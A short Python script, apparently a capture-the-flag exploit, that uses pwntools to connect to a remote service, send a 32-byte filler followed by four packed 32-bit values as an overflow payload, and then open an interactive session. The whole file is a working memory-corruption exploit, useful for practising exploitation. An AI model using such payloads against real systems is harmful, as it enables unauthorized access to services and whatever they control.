from pwn import *
proc = remote("109.233.56.90", 11578)
input()
for i in range(8):
    proc.send(chr(i + ord("A")).encode()*4)
proc.send(p32(0xcafeba)+p32(0xbedead)+p32(0xbeef11)+p32(0xff2211))
proc.interactive()
